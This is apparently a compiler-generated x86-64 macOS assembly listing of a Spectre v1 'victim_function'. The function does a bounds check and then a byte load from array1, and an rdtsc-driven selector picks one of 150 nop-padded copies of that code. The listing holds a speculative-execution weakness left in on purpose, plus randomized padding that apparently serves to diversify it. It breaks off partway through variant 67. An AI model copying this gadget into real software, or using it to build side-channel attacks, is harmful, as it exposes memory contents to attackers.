	.section	__TEXT,__text,regular,pure_instructions
	.build_version macos, 15, 0	sdk_version 26, 1
	.globl	_victim_function                ## -- Begin function victim_function
	.p2align	4, 0x90
_victim_function:
	.cfi_startproc
## %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset %rbp, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register %rbp
	movq	%rdi, -8(%rbp)
	movq	-8(%rbp), %rax
	movl	_array1_size(%rip), %ecx
                                        ## kill: def $rcx killed $ecx
## Start of variant dynamic selector
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$150, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.Lvictim_function_win0_var0
	cmpl	$1, %eax
	je	.Lvictim_function_win0_var1
	cmpl	$2, %eax
	je	.Lvictim_function_win0_var2
	cmpl	$3, %eax
	je	.Lvictim_function_win0_var3
	cmpl	$4, %eax
	je	.Lvictim_function_win0_var4
	cmpl	$5, %eax
	je	.Lvictim_function_win0_var5
	cmpl	$6, %eax
	je	.Lvictim_function_win0_var6
	cmpl	$7, %eax
	je	.Lvictim_function_win0_var7
	cmpl	$8, %eax
	je	.Lvictim_function_win0_var8
	cmpl	$9, %eax
	je	.Lvictim_function_win0_var9
	cmpl	$10, %eax
	je	.Lvictim_function_win0_var10
	cmpl	$11, %eax
	je	.Lvictim_function_win0_var11
	cmpl	$12, %eax
	je	.Lvictim_function_win0_var12
	cmpl	$13, %eax
	je	.Lvictim_function_win0_var13
	cmpl	$14, %eax
	je	.Lvictim_function_win0_var14
	cmpl	$15, %eax
	je	.Lvictim_function_win0_var15
	cmpl	$16, %eax
	je	.Lvictim_function_win0_var16
	cmpl	$17, %eax
	je	.Lvictim_function_win0_var17
	cmpl	$18, %eax
	je	.Lvictim_function_win0_var18
	cmpl	$19, %eax
	je	.Lvictim_function_win0_var19
	cmpl	$20, %eax
	je	.Lvictim_function_win0_var20
	cmpl	$21, %eax
	je	.Lvictim_function_win0_var21
	cmpl	$22, %eax
	je	.Lvictim_function_win0_var22
	cmpl	$23, %eax
	je	.Lvictim_function_win0_var23
	cmpl	$24, %eax
	je	.Lvictim_function_win0_var24
	cmpl	$25, %eax
	je	.Lvictim_function_win0_var25
	cmpl	$26, %eax
	je	.Lvictim_function_win0_var26
	cmpl	$27, %eax
	je	.Lvictim_function_win0_var27
	cmpl	$28, %eax
	je	.Lvictim_function_win0_var28
	cmpl	$29, %eax
	je	.Lvictim_function_win0_var29
	cmpl	$30, %eax
	je	.Lvictim_function_win0_var30
	cmpl	$31, %eax
	je	.Lvictim_function_win0_var31
	cmpl	$32, %eax
	je	.Lvictim_function_win0_var32
	cmpl	$33, %eax
	je	.Lvictim_function_win0_var33
	cmpl	$34, %eax
	je	.Lvictim_function_win0_var34
	cmpl	$35, %eax
	je	.Lvictim_function_win0_var35
	cmpl	$36, %eax
	je	.Lvictim_function_win0_var36
	cmpl	$37, %eax
	je	.Lvictim_function_win0_var37
	cmpl	$38, %eax
	je	.Lvictim_function_win0_var38
	cmpl	$39, %eax
	je	.Lvictim_function_win0_var39
	cmpl	$40, %eax
	je	.Lvictim_function_win0_var40
	cmpl	$41, %eax
	je	.Lvictim_function_win0_var41
	cmpl	$42, %eax
	je	.Lvictim_function_win0_var42
	cmpl	$43, %eax
	je	.Lvictim_function_win0_var43
	cmpl	$44, %eax
	je	.Lvictim_function_win0_var44
	cmpl	$45, %eax
	je	.Lvictim_function_win0_var45
	cmpl	$46, %eax
	je	.Lvictim_function_win0_var46
	cmpl	$47, %eax
	je	.Lvictim_function_win0_var47
	cmpl	$48, %eax
	je	.Lvictim_function_win0_var48
	cmpl	$49, %eax
	je	.Lvictim_function_win0_var49
	cmpl	$50, %eax
	je	.Lvictim_function_win0_var50
	cmpl	$51, %eax
	je	.Lvictim_function_win0_var51
	cmpl	$52, %eax
	je	.Lvictim_function_win0_var52
	cmpl	$53, %eax
	je	.Lvictim_function_win0_var53
	cmpl	$54, %eax
	je	.Lvictim_function_win0_var54
	cmpl	$55, %eax
	je	.Lvictim_function_win0_var55
	cmpl	$56, %eax
	je	.Lvictim_function_win0_var56
	cmpl	$57, %eax
	je	.Lvictim_function_win0_var57
	cmpl	$58, %eax
	je	.Lvictim_function_win0_var58
	cmpl	$59, %eax
	je	.Lvictim_function_win0_var59
	cmpl	$60, %eax
	je	.Lvictim_function_win0_var60
	cmpl	$61, %eax
	je	.Lvictim_function_win0_var61
	cmpl	$62, %eax
	je	.Lvictim_function_win0_var62
	cmpl	$63, %eax
	je	.Lvictim_function_win0_var63
	cmpl	$64, %eax
	je	.Lvictim_function_win0_var64
	cmpl	$65, %eax
	je	.Lvictim_function_win0_var65
	cmpl	$66, %eax
	je	.Lvictim_function_win0_var66
	cmpl	$67, %eax
	je	.Lvictim_function_win0_var67
	cmpl	$68, %eax
	je	.Lvictim_function_win0_var68
	cmpl	$69, %eax
	je	.Lvictim_function_win0_var69
	cmpl	$70, %eax
	je	.Lvictim_function_win0_var70
	cmpl	$71, %eax
	je	.Lvictim_function_win0_var71
	cmpl	$72, %eax
	je	.Lvictim_function_win0_var72
	cmpl	$73, %eax
	je	.Lvictim_function_win0_var73
	cmpl	$74, %eax
	je	.Lvictim_function_win0_var74
	cmpl	$75, %eax
	je	.Lvictim_function_win0_var75
	cmpl	$76, %eax
	je	.Lvictim_function_win0_var76
	cmpl	$77, %eax
	je	.Lvictim_function_win0_var77
	cmpl	$78, %eax
	je	.Lvictim_function_win0_var78
	cmpl	$79, %eax
	je	.Lvictim_function_win0_var79
	cmpl	$80, %eax
	je	.Lvictim_function_win0_var80
	cmpl	$81, %eax
	je	.Lvictim_function_win0_var81
	cmpl	$82, %eax
	je	.Lvictim_function_win0_var82
	cmpl	$83, %eax
	je	.Lvictim_function_win0_var83
	cmpl	$84, %eax
	je	.Lvictim_function_win0_var84
	cmpl	$85, %eax
	je	.Lvictim_function_win0_var85
	cmpl	$86, %eax
	je	.Lvictim_function_win0_var86
	cmpl	$87, %eax
	je	.Lvictim_function_win0_var87
	cmpl	$88, %eax
	je	.Lvictim_function_win0_var88
	cmpl	$89, %eax
	je	.Lvictim_function_win0_var89
	cmpl	$90, %eax
	je	.Lvictim_function_win0_var90
	cmpl	$91, %eax
	je	.Lvictim_function_win0_var91
	cmpl	$92, %eax
	je	.Lvictim_function_win0_var92
	cmpl	$93, %eax
	je	.Lvictim_function_win0_var93
	cmpl	$94, %eax
	je	.Lvictim_function_win0_var94
	cmpl	$95, %eax
	je	.Lvictim_function_win0_var95
	cmpl	$96, %eax
	je	.Lvictim_function_win0_var96
	cmpl	$97, %eax
	je	.Lvictim_function_win0_var97
	cmpl	$98, %eax
	je	.Lvictim_function_win0_var98
	cmpl	$99, %eax
	je	.Lvictim_function_win0_var99
	cmpl	$100, %eax
	je	.Lvictim_function_win0_var100
	cmpl	$101, %eax
	je	.Lvictim_function_win0_var101
	cmpl	$102, %eax
	je	.Lvictim_function_win0_var102
	cmpl	$103, %eax
	je	.Lvictim_function_win0_var103
	cmpl	$104, %eax
	je	.Lvictim_function_win0_var104
	cmpl	$105, %eax
	je	.Lvictim_function_win0_var105
	cmpl	$106, %eax
	je	.Lvictim_function_win0_var106
	cmpl	$107, %eax
	je	.Lvictim_function_win0_var107
	cmpl	$108, %eax
	je	.Lvictim_function_win0_var108
	cmpl	$109, %eax
	je	.Lvictim_function_win0_var109
	cmpl	$110, %eax
	je	.Lvictim_function_win0_var110
	cmpl	$111, %eax
	je	.Lvictim_function_win0_var111
	cmpl	$112, %eax
	je	.Lvictim_function_win0_var112
	cmpl	$113, %eax
	je	.Lvictim_function_win0_var113
	cmpl	$114, %eax
	je	.Lvictim_function_win0_var114
	cmpl	$115, %eax
	je	.Lvictim_function_win0_var115
	cmpl	$116, %eax
	je	.Lvictim_function_win0_var116
	cmpl	$117, %eax
	je	.Lvictim_function_win0_var117
	cmpl	$118, %eax
	je	.Lvictim_function_win0_var118
	cmpl	$119, %eax
	je	.Lvictim_function_win0_var119
	cmpl	$120, %eax
	je	.Lvictim_function_win0_var120
	cmpl	$121, %eax
	je	.Lvictim_function_win0_var121
	cmpl	$122, %eax
	je	.Lvictim_function_win0_var122
	cmpl	$123, %eax
	je	.Lvictim_function_win0_var123
	cmpl	$124, %eax
	je	.Lvictim_function_win0_var124
	cmpl	$125, %eax
	je	.Lvictim_function_win0_var125
	cmpl	$126, %eax
	je	.Lvictim_function_win0_var126
	cmpl	$127, %eax
	je	.Lvictim_function_win0_var127
	cmpl	$128, %eax
	je	.Lvictim_function_win0_var128
	cmpl	$129, %eax
	je	.Lvictim_function_win0_var129
	cmpl	$130, %eax
	je	.Lvictim_function_win0_var130
	cmpl	$131, %eax
	je	.Lvictim_function_win0_var131
	cmpl	$132, %eax
	je	.Lvictim_function_win0_var132
	cmpl	$133, %eax
	je	.Lvictim_function_win0_var133
	cmpl	$134, %eax
	je	.Lvictim_function_win0_var134
	cmpl	$135, %eax
	je	.Lvictim_function_win0_var135
	cmpl	$136, %eax
	je	.Lvictim_function_win0_var136
	cmpl	$137, %eax
	je	.Lvictim_function_win0_var137
	cmpl	$138, %eax
	je	.Lvictim_function_win0_var138
	cmpl	$139, %eax
	je	.Lvictim_function_win0_var139
	cmpl	$140, %eax
	je	.Lvictim_function_win0_var140
	cmpl	$141, %eax
	je	.Lvictim_function_win0_var141
	cmpl	$142, %eax
	je	.Lvictim_function_win0_var142
	cmpl	$143, %eax
	je	.Lvictim_function_win0_var143
	cmpl	$144, %eax
	je	.Lvictim_function_win0_var144
	cmpl	$145, %eax
	je	.Lvictim_function_win0_var145
	cmpl	$146, %eax
	je	.Lvictim_function_win0_var146
	cmpl	$147, %eax
	je	.Lvictim_function_win0_var147
	cmpl	$148, %eax
	je	.Lvictim_function_win0_var148
	cmpl	$149, %eax
	je	.Lvictim_function_win0_var149
	jmp	.Lvictim_function_win0_var0
## Variant 0
.Lvictim_function_win0_var0:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 1
.Lvictim_function_win0_var1:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
## %bb.1:
	nop
	nop
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	nop
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 2
.Lvictim_function_win0_var2:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	nop
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 3
.Lvictim_function_win0_var3:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
	nop
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 4
.Lvictim_function_win0_var4:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
## %bb.1:
	movq	-8(%rbp), %rcx
	nop
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 5
.Lvictim_function_win0_var5:
	popq	%rax
	nop
	cmpq	%rcx, %rax
	jae	LBB0_2
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 6
.Lvictim_function_win0_var6:
	popq	%rax
	nop
	cmpq	%rcx, %rax
	jae	LBB0_2
## %bb.1:
	movq	-8(%rbp), %rcx
	nop
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 7
.Lvictim_function_win0_var7:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
## %bb.1:
	nop
	movq	-8(%rbp), %rcx
	nop
	leaq	_array1(%rip), %rax
	nop
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 8
.Lvictim_function_win0_var8:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
## %bb.1:
	nop
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	nop
	nop
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 9
.Lvictim_function_win0_var9:
	popq	%rax
	cmpq	%rcx, %rax
	nop
	jae	LBB0_2
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	nop
	movzbl	(%rax,%rcx), %eax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 10
.Lvictim_function_win0_var10:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
## %bb.1:
	nop
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 11
.Lvictim_function_win0_var11:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
## %bb.1:
	movq	-8(%rbp), %rcx
	nop
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	nop
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 12
.Lvictim_function_win0_var12:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
	nop
## %bb.1:
	nop
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	nop
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 13
.Lvictim_function_win0_var13:
	popq	%rax
	cmpq	%rcx, %rax
	nop
	jae	LBB0_2
## %bb.1:
	nop
	nop
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 14
.Lvictim_function_win0_var14:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
	nop
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	nop
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 15
.Lvictim_function_win0_var15:
	popq	%rax
	cmpq	%rcx, %rax
	nop
	jae	LBB0_2
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	nop
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 16
.Lvictim_function_win0_var16:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 17
.Lvictim_function_win0_var17:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 18
.Lvictim_function_win0_var18:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
## %bb.1:
	nop
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	nop
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 19
.Lvictim_function_win0_var19:
	popq	%rax
	cmpq	%rcx, %rax
	nop
	nop
	jae	LBB0_2
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 20
.Lvictim_function_win0_var20:
	popq	%rax
	cmpq	%rcx, %rax
	nop
	jae	LBB0_2
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 21
.Lvictim_function_win0_var21:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
## %bb.1:
	movq	-8(%rbp), %rcx
	nop
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 22
.Lvictim_function_win0_var22:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
## %bb.1:
	movq	-8(%rbp), %rcx
	nop
	leaq	_array1(%rip), %rax
	nop
	nop
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 23
.Lvictim_function_win0_var23:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
	nop
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 24
.Lvictim_function_win0_var24:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
	nop
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	nop
	nop
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 25
.Lvictim_function_win0_var25:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
	nop
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 26
.Lvictim_function_win0_var26:
	popq	%rax
	cmpq	%rcx, %rax
	nop
	jae	LBB0_2
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 27
.Lvictim_function_win0_var27:
	popq	%rax
	nop
	cmpq	%rcx, %rax
	jae	LBB0_2
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	nop
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 28
.Lvictim_function_win0_var28:
	popq	%rax
	cmpq	%rcx, %rax
	nop
	jae	LBB0_2
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 29
.Lvictim_function_win0_var29:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
	nop
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	nop
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 30
.Lvictim_function_win0_var30:
	popq	%rax
	cmpq	%rcx, %rax
	nop
	nop
	jae	LBB0_2
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 31
.Lvictim_function_win0_var31:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
## %bb.1:
	nop
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	nop
	nop
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 32
.Lvictim_function_win0_var32:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
	nop
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 33
.Lvictim_function_win0_var33:
	popq	%rax
	nop
	cmpq	%rcx, %rax
	jae	LBB0_2
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 34
.Lvictim_function_win0_var34:
	popq	%rax
	nop
	cmpq	%rcx, %rax
	jae	LBB0_2
## %bb.1:
	nop
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 35
.Lvictim_function_win0_var35:
	popq	%rax
	nop
	nop
	cmpq	%rcx, %rax
	jae	LBB0_2
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 36
.Lvictim_function_win0_var36:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
## %bb.1:
	movq	-8(%rbp), %rcx
	nop
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 37
.Lvictim_function_win0_var37:
	popq	%rax
	nop
	cmpq	%rcx, %rax
	jae	LBB0_2
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 38
.Lvictim_function_win0_var38:
	popq	%rax
	cmpq	%rcx, %rax
	nop
	jae	LBB0_2
## %bb.1:
	nop
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 39
.Lvictim_function_win0_var39:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	nop
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 40
.Lvictim_function_win0_var40:
	popq	%rax
	nop
	cmpq	%rcx, %rax
	jae	LBB0_2
## %bb.1:
	nop
	nop
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 41
.Lvictim_function_win0_var41:
	popq	%rax
	cmpq	%rcx, %rax
	nop
	jae	LBB0_2
## %bb.1:
	movq	-8(%rbp), %rcx
	nop
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 42
.Lvictim_function_win0_var42:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	nop
	nop
	movzbl	(%rax,%rcx), %eax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 43
.Lvictim_function_win0_var43:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
## %bb.1:
	movq	-8(%rbp), %rcx
	nop
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 44
.Lvictim_function_win0_var44:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
## %bb.1:
	movq	-8(%rbp), %rcx
	nop
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 45
.Lvictim_function_win0_var45:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	nop
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 46
.Lvictim_function_win0_var46:
	popq	%rax
	cmpq	%rcx, %rax
	nop
	jae	LBB0_2
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 47
.Lvictim_function_win0_var47:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
	nop
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 48
.Lvictim_function_win0_var48:
	popq	%rax
	nop
	cmpq	%rcx, %rax
	nop
	jae	LBB0_2
## %bb.1:
	nop
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 49
.Lvictim_function_win0_var49:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
## %bb.1:
	nop
	nop
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 50
.Lvictim_function_win0_var50:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	nop
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 51
.Lvictim_function_win0_var51:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	nop
	movzbl	(%rax,%rcx), %eax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 52
.Lvictim_function_win0_var52:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	nop
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 53
.Lvictim_function_win0_var53:
	popq	%rax
	cmpq	%rcx, %rax
	nop
	jae	LBB0_2
## %bb.1:
	movq	-8(%rbp), %rcx
	nop
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 54
.Lvictim_function_win0_var54:
	popq	%rax
	nop
	nop
	nop
	cmpq	%rcx, %rax
	jae	LBB0_2
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 55
.Lvictim_function_win0_var55:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
	nop
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 56
.Lvictim_function_win0_var56:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
## %bb.1:
	nop
	nop
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 57
.Lvictim_function_win0_var57:
	popq	%rax
	nop
	cmpq	%rcx, %rax
	jae	LBB0_2
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	nop
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 58
.Lvictim_function_win0_var58:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
	nop
## %bb.1:
	nop
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 59
.Lvictim_function_win0_var59:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
	nop
## %bb.1:
	nop
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 60
.Lvictim_function_win0_var60:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
## %bb.1:
	movq	-8(%rbp), %rcx
	nop
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 61
.Lvictim_function_win0_var61:
	popq	%rax
	cmpq	%rcx, %rax
	nop
	jae	LBB0_2
## %bb.1:
	movq	-8(%rbp), %rcx
	nop
	nop
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 62
.Lvictim_function_win0_var62:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
## %bb.1:
	movq	-8(%rbp), %rcx
	nop
	nop
	nop
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 63
.Lvictim_function_win0_var63:
	popq	%rax
	cmpq	%rcx, %rax
	nop
	jae	LBB0_2
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	nop
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 64
.Lvictim_function_win0_var64:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
	nop
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 65
.Lvictim_function_win0_var65:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
	nop
	nop
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 66
.Lvictim_function_win0_var66:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
## %bb.1:
	movq	-8(%rbp), %rcx
	nop
	nop
	leaq	_array1(%rip), %rax
	nop
	movzbl	(%rax,%rcx), %eax
	jmp	.Lvictim_function_win0_continue
## Variant 67
.Lvictim_function_win0_var67:
	popq	%rax
	cmpq	%rcx, %rax
	jae	LBB0_2
## %bb.1:
	movq	-8(%rbp), %rcx
	leaq	_array1(%rip), %rax
	movzbl	(%rax,%rcx), %eax
	nop
